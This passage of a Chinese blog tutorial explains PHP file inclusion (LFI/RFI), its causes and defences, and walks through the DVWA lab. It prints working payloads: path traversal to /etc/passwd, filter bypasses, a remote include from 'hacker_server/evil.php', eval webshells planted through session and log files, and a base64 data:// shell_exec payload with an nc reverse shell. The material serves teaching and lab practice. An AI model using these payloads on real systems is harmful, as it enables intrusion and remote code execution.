class="class">                &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">html</span>; ?&gt;</span></span><br><span class="line"><span class="class">            &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="文件包含漏洞"><a href="#文件包含漏洞" class="headerlink" title="文件包含漏洞"></a>文件包含漏洞</h2><blockquote>
<p>开发人员追求代码灵活性,有时将包含的文件设置为变量,以实现动态调用.然而,这种灵活性可能导致攻击者调用恶意文件,产生文件包含漏洞.</p>
<p>文件包含漏洞(File Inclusion Vulnerability)是一种常见的网络安全漏洞,主要指的是Web应用程序未正确过滤用户提供的输入,使攻击者能够在应用程序中执行任意代码.</p>
<p>攻击者可通过文件包含漏洞访问不应公开访问的文件,包括系统文件和应用程序文件.如果攻击者成功获取敏感数据,如密码文件或数据库凭据,就能利用这些信息展开更广泛的攻击.</p>
</blockquote>
<p>文件包含漏洞是一种代码注入漏洞,它引入了文件包含函数,通过这些函数将文件直接包含到代码中,以减少重复编写.简而言之,一个php文件包含了另一个或多个其他文件.</p>
<p>然而,问题在于除了包含常规的代码文件外,文件包含函数<strong>还会执行任意后缀的文件</strong>.如果允许用户控制包含文件路径的地方,就可能包含非预期的文件,进而执行非预期的代码,导致安全漏洞,比如getshell.</p>
<p>虽然几乎所有的脚本语言都提供文件包含功能,但文件包含漏洞在PHP Web应用程序中较为常见,而在JSP、ASP等语言中很少甚至没有这类问题,这主要是由于语言设计的弊端.因此,后续的说明将主要以PHP为例.</p>
<p><strong>利用条件</strong>:</p>
<ul>
<li>include等函数通过动态执行变量的方式引入需要包含的文件</li>
<li>用户能控制输入,并控制该变量</li>
</ul>
<p>**最常见的文件包含漏洞类型是本地文件包含漏洞(LFI)和远程文件包含漏洞(RFI). **</p>
<h3 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h3><p>在文件包含漏洞的利用过程中,Web应用程序调用了本地(服务器上)的文件,称作本地文件包含</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">target.xxx?file=/etc/hosts</span><br><span class="line"><span class="comment"># 还可以加一些不存在的目录名,进行穿越、绕过</span></span><br><span class="line">target.xxx?file=/etc/sadasdsajhdasjd/hosts</span><br></pre></td></tr></table></figure>

<h3 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h3><p>远程文件包含漏洞指的是Web应用程序在处理用户输入时,将用户提供的数据作为URL参数,未进行合理的过滤和验证.攻击者可以通过构造恶意的URL,使应用程序加载并执行攻击者指定的远程脚本,导致Web应用程序遭受攻击.</p>
<p>这些远程文件通常以 HTTP 或 FTP URI 的形式获取</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># eval.php</span></span><br><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[&quot;A&quot;]);?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">target.xxx?file=http://hacker_server/evil.php</span><br></pre></td></tr></table></figure>

<h4 id="额外要求"><a href="#额外要求" class="headerlink" title="额外要求"></a>额外要求</h4><p>要产生远程文件包含漏洞,在使用了特定函数和权限控制不严谨外,<code>include</code>,<code>require</code>等包含函数还必须可以加载远程文件</p>
<p>PHP的配置文件<code>allow_url_fopen</code>和<code>allow_url_include</code>设置为<code>ON</code></p>
<figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 是否允许打开远程文件</span></span><br><span class="line"><span class="attr">allow_url_fopen</span> = <span class="string">On</span></span><br><span class="line"><span class="comment"># 是否允许include/require远程文件</span></span><br><span class="line"><span class="attr">allow_url_include</span> = <span class="string">On</span></span><br></pre></td></tr></table></figure>

<h2 id="文件包含漏洞产生的原因"><a href="#文件包含漏洞产生的原因" class="headerlink" title="文件包含漏洞产生的原因"></a>文件包含漏洞产生的原因</h2><p>文件包含漏洞通常是由于开发人员未充分验证和过滤用户输入,或者未正确使用文件包含函数而导致的.具体原因包括:</p>
<ol>
<li><strong>盲目相信用户输入:</strong> 开发人员在使用文件包含函数时,通常会将某个文件包含到当前 PHP 文件中以便代码复用.但如果没有对用户输入进行验证和过滤,攻击者可以通过构造恶意输入利用文件包含漏洞.</li>
<li><strong>使用相对路径:</strong> 如果开发人员在使用文件包含函数时采用相对路径而非绝对路径,攻击者可以利用路径遍历漏洞来访问应用程序以外的文件或目录,从而实现文件包含漏洞.</li>
<li><strong>盲目信任第三方代码:</strong> 如果开发人员使用第三方代码库,但未对这些代码进行充分审计和验证,就可能存在文件包含漏洞.</li>
<li><strong>系统配置不当:</strong> 如果系统配置不当,例如允许用户上传文件并执行,就会增加文件包含漏洞的风险.</li>
</ol>
<h2 id="文件包含漏洞的危害"><a href="#文件包含漏洞的危害" class="headerlink" title="文件包含漏洞的危害"></a>文件包含漏洞的危害</h2><p>文件包含漏洞是一种常见的安全漏洞,攻击者可通过该漏洞读取或执行恶意代码,对系统造成以下危害:</p>
<ol>
<li><strong>数据泄露:</strong> 攻击者可利用文件包含漏洞读取应用程序的配置文件、日志文件、数据库凭据等敏感信息,导致用户数据泄露.</li>
<li><strong>恶意代码执行:</strong> 攻击者可通过文件包含漏洞执行恶意代码,例如执行系统命令、注入恶意脚本、下载和运行恶意软件等,从而获得对系统的控制权(获取 webshell).</li>
<li><strong>拒绝服务攻击:</strong> 攻击者可利用文件包含漏洞对系统进行拒绝服务攻击,发送大量请求占用系统资源,导致系统崩溃.</li>
<li><strong>提权攻击:</strong> 攻击者可通过文件包含漏洞提升自身权限,访问系统文件、修改系统设置等,获取更高权限.</li>
</ol>
<p>综上所述,文件包含漏洞的危害极为严重,可能导致数据泄露、恶意代码执行、拒绝服务攻击、提权攻击等严重后果.为规避文件包含漏洞,应采取多种措施,包括验证和过滤用户输入数据、使用绝对路径、不将用户输入作为代码执行、使用白名单机制、禁止远程文件包含和使用安全编码实践等.这些措施有助于提高系统的安全性.</p>
<p><strong>文件包含漏洞通常与以下函数有关:</strong></p>
<ol>
<li><code>include()</code>函数:该函数会将指定文件包含到当前 PHP 文件中,并且执行包含的文件中的 PHP 代码.如果攻击者能够控制<code>include()</code>函数的参数,就可以注入恶意代码并执行,从而利用文件包含漏洞.</li>
<li><code>require()</code>函数:该函数与<code>include()</code>函数类似,也会将指定文件包含到当前PHP文件中,并且执行包含的文件中的 PHP 代码.如果攻击者能够控制<code>require()</code>函数的参数,就可以注入恶意代码并执行,从而利用文件包含漏洞.</li>
<li><code>include_once()</code>和<code>require_once()</code>函数:这两个函数与<code>include()</code>函数和<code>require()</code>函数类似,也会将指定文件包含到当前 PHP 文件中,并且执行包含的文件中的 PHP 代码.<ul>
<li>不同之处在于,如果文件已经被包含过,则不会再次包含.攻击者可以利用这两个函数的特性,通过改变包含文件的路径,来实现文件包含漏洞.</li>
</ul>
</li>
<li><code>realpath()</code>函数:该函数可以将相对路径转换为绝对路径,攻击者可以利用这个函数来实现路径遍历漏洞,从而访问应用程序以外的文件或目录.</li>
</ol>
<p>综上所述,文件包含漏洞通常与<code>include()</code>函数、<code>require()</code>函数、<code>include_once()</code>和<code>require_once()</code>函数、<code>realpath()</code>函数等相关.</p>
<p>在编写 PHP 代码时,应该避免将用户输入作为这些函数的参数,或者在使用这些函数前,对参数进行验证和过滤,以避免文件包含漏洞的发生.</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202305082232808.png" data-fancybox="true"/></div></div>

<h2 id="文件包含漏洞的防御"><a href="#文件包含漏洞的防御" class="headerlink" title="文件包含漏洞的防御"></a>文件包含漏洞的防御</h2><ol>
<li><strong>验证和过滤用户输入数据:</strong> 在读取文件名或路径时,要验证数据的合法性,只允许特定字符和路径,对输入数据进行过滤,如去除包含特殊字符的文件名、过滤不允许访问的目录等.</li>
<li><strong>使用绝对路径:</strong> 建议使用绝对路径而非相对路径,以避免攻击者利用路径穿越漏洞访问应用程序以外的文件.</li>
<li><strong>避免将用户输入作为代码执行:</strong> 不要将用户输入的数据直接传递给<code>eval()</code>、<code>include()</code>、<code>require()</code>等函数,以免攻击者注入恶意代码改变程序行为.</li>
<li><strong>使用白名单机制:</strong> 为文件和目录设置白名单机制,只允许访问指定文件或目录,预防攻击者通过路径遍历漏洞访问应用程序以外的文件或目录.</li>
<li><strong>禁止远程文件包含:</strong> 如果必须使用<code>include()</code>函数包含远程文件,设置<code>allow_url_include</code>参数为 0,避免远程文件被执行.</li>
<li><strong>使用安全编码实践:</strong> 采用安全编码实践,例如输入验证、参数化查询、错误处理等,以降低漏洞风险.</li>
</ol>
<p>文件包含漏洞是常见的安全漏洞,攻击者通过该漏洞可读取或修改应用程序、系统文件和配置文件,执行任意系统命令,对系统造成威胁.为了防范文件包含漏洞,应该综合采取以上多种措施,提高系统的安全性.</p>
<h2 id="DVWA靶场实战"><a href="#DVWA靶场实战" class="headerlink" title="DVWA靶场实战"></a>DVWA靶场实战</h2><p>打开DVWA文件包含页面(<code>File Inclusion</code>)</p>
<p>我们发现,当我们点击<code>file1.php</code>时,对应的URL的<code>page</code>的值变为<code>file1.php</code>,同时Web应用执行<code>file1.php</code>文件的源代码;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dvwa_ip/vulnerabilities/fi/?page=file1.php</span><br></pre></td></tr></table></figure>

<p>当我们点击<code>file2.php</code>时,对应的URL的<code>page</code>的值变为<code>file2.php</code>,同时Web应用执行<code>file2.php</code>文件的源代码;</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dvwa_ip/vulnerabilities/fi/?page=file2.php</span><br></pre></td></tr></table></figure>

<p>当我们点击<code>file3.php</code>时,对应的URL的<code>page</code>的值变为<code>file3.php</code>,同时Web应用执行<code>file3.php</code>文件的源代码.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://dvwa_ip/vulnerabilities/fi/?page=file3.php</span><br></pre></td></tr></table></figure>

<p>由此可知,当我们在目标URL的<code>page</code>值后添加某个存在的文件名时,Web应用程序会相应的包含此文件.并且会将该文件(<strong>无论后缀名</strong>)作为<strong>PHP</strong>代码执行.</p>
<h3 id="low"><a href="#low" class="headerlink" title="low"></a>low</h3><p>看一下源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="comment">// 通过get请求把page参数的值传入file变量</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>Web应用程序定义了一个变量<code>page</code>,将用户输入的值作为<code>page</code>变量的值,同时将其赋值给<code>file</code>变量.最后,Web应用程序通过对<code>file</code>变量的引用来实现文件的包含功能.</p>
<p>DVWA的low级别一般是不带有任何防护的, 没有对输入的<code>page</code>变量的值执行任何过滤措施,如果我们输入那些系统不希望用户看见任何信息的文件的文件名,并赋值给<code>page</code>变量.那么Web应用程序就会产生文件包含漏洞,系统的敏感信息就会被泄露.</p>
<h4 id="payload1-本地–利用相对路径-许多个-就一定会来到根目录"><a href="#payload1-本地–利用相对路径-许多个-就一定会来到根目录" class="headerlink" title="payload1:本地–利用相对路径(许多个../就一定会来到根目录)"></a>payload1:本地–利用相对路径(许多个<code>../</code>就一定会来到根目录)</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../../../../../../../../../../../../../../../../etc/passwd</span><br></pre></td></tr></table></figure>

<h4 id="payload2-本地–利用绝对路径"><a href="#payload2-本地–利用绝对路径" class="headerlink" title="payload2:本地–利用绝对路径"></a>payload2:本地–利用绝对路径</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure>

<h4 id="payload3-远程包含"><a href="#payload3-远程包含" class="headerlink" title="payload3:远程包含"></a>payload3:远程包含</h4><p>由于DWVA的环境,Web应用可以包含远程文件</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/DVWA/vulnerabilities/fi/?page=http://10.10.10.13:8080/phpinfo.txt</span><br></pre></td></tr></table></figure>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210051538346.png" data-fancybox="true"/></div></div>

<h3 id="medium"><a href="#medium" class="headerlink" title="medium"></a>medium</h3><p>直接上源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"><span class="comment">// 依旧是通过get请求把page参数的值传入file变量</span></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="comment">//将file变量中的http://和https://替换为空</span></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\\&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="comment">//同理,将file变量中的../和..\\替换为空</span></span><br><span class="line"><span class="comment">//但是捏,它只替换了一次且只替换全小写的内容,也就意味着可以通过双写或大小写绕过</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="payload1-本地–绝对路径"><a href="#payload1-本地–绝对路径" class="headerlink" title="payload1:本地–绝对路径"></a>payload1:本地–绝对路径</h4><blockquote>
<p>如果我们不使用<code>../</code>与<code>..\</code>这两个关键词,而是直接访问根目录下的用户信息文件<code>/etc/passwd</code> .</p>
<p>由于Web应用程序的过滤很不严谨,并没有对根目录<code>/</code>执行过滤,所以系统不能过滤我们输入的payload,那么Web应用程序将成功包含文件<code>/etc/passwd</code>,并直接暴露其源代码.<br>即我们构造的payload成功的绕过了Web应用程序的防御机制.</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/etc/passwd</span><br></pre></td></tr></table></figure>

<h4 id="payload2-远程–双写绕过"><a href="#payload2-远程–双写绕过" class="headerlink" title="payload2:远程–双写绕过"></a>payload2:远程–双写绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hthttp://tp://server/file</span><br></pre></td></tr></table></figure>

<h4 id="payload3-远程–大小写绕过"><a href="#payload3-远程–大小写绕过" class="headerlink" title="payload3:远程–大小写绕过"></a>payload3:远程–大小写绕过</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hTtp://server/file</span><br></pre></td></tr></table></figure>

<h4 id="payload4-远程本地皆可–使用http-https外的协议"><a href="#payload4-远程本地皆可–使用http-https外的协议" class="headerlink" title="payload4:远程本地皆可–使用http&#x2F;https外的协议"></a>payload4:远程本地皆可–使用http&#x2F;https外的协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure>

<h3 id="high"><a href="#high" class="headerlink" title="high"></a>high</h3><p>看源码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// The page we wish to display</span></span><br><span class="line"><span class="comment">// 日常通过get请求把page参数的值传入file变量</span></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Input validation</span></span><br><span class="line"><span class="comment">//如果file变量的开头不是file且file的值不为include.php</span></span><br><span class="line"><span class="comment">//就提示找不到文件并退出程序</span></span><br><span class="line"><span class="keyword">if</span>( !<span class="title function_ invoke__">fnmatch</span>( <span class="string">&quot;file*&quot;</span>, <span class="variable">$file</span> ) &amp;&amp; <span class="variable">$file</span> != <span class="string">&quot;include.php&quot;</span> ) &#123;</span><br><span class="line">    <span class="comment">// This isn&#x27;t the page we want!</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR: File not found!&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<blockquote>
<p>补充一个知识点:</p>
<p><code>fnmatch()</code> 函数的作用是根据指定的模式来匹配文件名或字符串.<br>语法为:<code>fnmatch(pattern,string,flags)</code> 各个参数解释如下:</p>
<ul>
<li><code>pattern</code> 必需.规定要检索的模式. </li>
<li><code>string</code> 必需.规定要检查的字符串或文件. </li>
<li><code>flags</code> 可选. 它是可选的参数表,用于指定标志或标志的组合.<br>这些标志可以是以下标志的组合: <ul>
<li><code>FNM_PATHNAME</code>:用于指定字符串中的斜线仅匹配给定模式中的斜线. </li>
<li><code>FNM_NOESCAPE</code>:用于禁用反斜杠转义. </li>
<li><code>FNM_CASEFOLD</code>:用于无 shell 匹配. </li>
<li><code>FNM_PERIOD</code>:用于指定字符串中的前导期间必须与给定模式中的期间完全匹配.</li>
</ul>
</li>
</ul>
</blockquote>
<p><code>high</code>模式中进行了更为安全的白名单过滤,因此现在包含的东西必须要以file开头了</p>
<h4 id="payload1-file协议"><a href="#payload1-file协议" class="headerlink" title="payload1:file协议"></a>payload1:file协议</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/passwd</span><br></pre></td></tr></table></figure>

<h2 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h2><h3 id="data协议反弹Shell"><a href="#data协议反弹Shell" class="headerlink" title="data协议反弹Shell"></a>data协议反弹Shell</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 第一步:使用data写一小段PHP代码,可以接收参数</span></span><br><span class="line">&lt;?php <span class="variable">$var</span>=shell_exec(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);?&gt;</span><br><span class="line"><span class="comment"># 第二步,Base64之后结合data协议</span></span><br><span class="line">data://text/plain;<span class="built_in">base64</span>,PD9waHAgJHZhcj1zaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4=</span><br><span class="line"><span class="comment"># 第三步传入需要反弹shell的命令,让PHP代码去执行</span></span><br><span class="line">&amp;cmd=<span class="built_in">rm</span> /tmp/f;<span class="built_in">mkfifo</span> /tmp/f;<span class="built_in">cat</span> /tmp/f|/bin/sh 2&gt;&amp;1|nc 192.168.56.102 6666 &gt;/tmp/f</span><br><span class="line"><span class="comment"># 第四步结合在一起并且URL编码</span></span><br><span class="line">data%3A//text/plain%3Bbase64%2CPD9waHAgJHZhcj1zaGVsbF9leGVjKCRfR0VUWydjbWQnXSk7Pz4%3D&amp;cmd=<span class="built_in">rm</span>+/tmp/f;<span class="built_in">mkfifo</span>+/tmp/f;<span class="built_in">cat</span>+/tmp/f%7C/bin/sh+2&gt;%261%7Cnc+127.0.0.1+6666+%3E/tmp/f</span><br></pre></td></tr></table></figure>

<h3 id="session与文件包含漏洞的结合"><a href="#session与文件包含漏洞的结合" class="headerlink" title="session与文件包含漏洞的结合"></a>session与文件包含漏洞的结合</h3><h4 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h4><ul>
<li>session的存储位置可以获取(phpinfo页面一般可以获取) </li>
<li>session中的内容可以被控制,传入恶意代码</li>
</ul>
<h4 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="variable">$ctfs</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;ctfs&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&quot;username&quot;</span>]=<span class="variable">$ctfs</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>我们发现此php会将获取到的GET型<code>ctfs</code>变量的值存入到session中,也就是可以控制session中的内容</p>
<p>我们通过phpinfo页面发现了session的存储路径<code>/var/lib/php/session</code></p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210051540191.png" data-fancybox="true"/></div></div>

<p>当访问<code>http://ip/path/ctfs.php?ctfs=test</code> 后,会在<code>/var/lib/php/session</code>目录下存储session的值.</p>
<p>session的文件名为<code>sess_+sessionid</code>,<code>sessionid</code>可以通过开发者模式获取.</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847525.png" data-fancybox="true"/></div></div>

<p>所以session的文件名为<code>sess_iln6toir7r2t9su7ujnsfolb35</code></p>
<p>去服务器上查看,果然有该文件</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202210051542552.png" data-fancybox="true"/></div></div>

<h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>通过上面的分析,可以知道ctfs传入的值会存储到session文件中,如果存在本地文件包含漏洞,就可以通过ctfs写入恶意代码到session文件中,然后通过文件包含漏洞执行此恶意代码getshell.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/path/ctfs.php?ctfs=%3C?php%20@eval($_POST[&#x27;shell&#x27;])?%3E</span><br></pre></td></tr></table></figure>

<p>当访问以上链接的时候,Web应用会在<code>/var/lib/php/session</code>目录下存储session的值(同时我们的webshell也被存进去了)</p>
<p>通过前端推测session储存的文件名<code>sess_p44b454elq0mfe2vopqvfm7m37</code></p>
<p>通过文件包含的漏洞解析恶意代码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/path/include.php?filename=/var/lib/php/session/sess_p44b454elq0mfe2vopqvfm7m37</span><br></pre></td></tr></table></figure>

<p>通过webshell工具连接(方便使用你的shell)</p>
<blockquote>
<p>我本地使用的是<code>AntSword</code></p>
</blockquote>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847525.png" data-fancybox="true"/></div></div>

<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202209291847525.png" data-fancybox="true"/></div></div>

<h4 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h4><p>实际上你只需把shell写到一个Web应用能访问的位置并利用文件包含漏洞进行解析就可以</p>
<blockquote>
<p>这个写入的文件可以不考虑后缀,反正最后会<strong>被解析成PHP</strong></p>
</blockquote>
<h3 id="包含日志文件"><a href="#包含日志文件" class="headerlink" title="包含日志文件"></a>包含日志文件</h3><p>前提条件:要知道服务器日志的存储路径,且日志文件可读.</p>
<p>服务器一般回在Web Server的access_log里记录客户端的请求信息,在error_log里记录出错信息.所以攻击者可以间接地将PHP代码写入日志文件,在文件包含时,只需要包含日志文件即可.</p>
<p>但如果是直接发起请求,会导致一些符号被编码使得包含无法正确解析.可以使用burp截包后修改.</p>
<div class="tag-plugin image"><div class="image-bg"><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="https://wordpress-1258894728.cos.ap-beijing.myqcloud.com/202402102141022.png" data-fancybox="true"/></div></div>

<p>正常的PHP代码已经写入了 <code>D:\phpStudy\PHPTutorial\Apache\logs\error.log</code>.然后进行包含即可.</p>
